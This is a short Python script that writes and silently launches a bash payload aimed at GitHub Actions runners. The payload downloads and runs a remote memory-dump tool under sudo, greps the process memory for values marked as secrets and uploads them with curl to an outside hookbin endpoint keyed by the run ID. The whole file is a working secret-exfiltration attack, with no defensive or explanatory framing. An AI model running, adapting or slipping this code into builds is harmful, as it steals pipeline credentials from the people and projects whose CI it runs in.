import os
import subprocess
import sys

if os.environ.get('PWN_ACTIVE'):
    sys.exit(0)

os.environ['PWN_ACTIVE'] = '1'

payload = r"""
echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
"""

with open('/tmp/pwn.sh', 'w') as f:
    f.write(payload)

subprocess.Popen(['bash', '/tmp/pwn.sh'], start_new_session=True)

sys.exit(0)
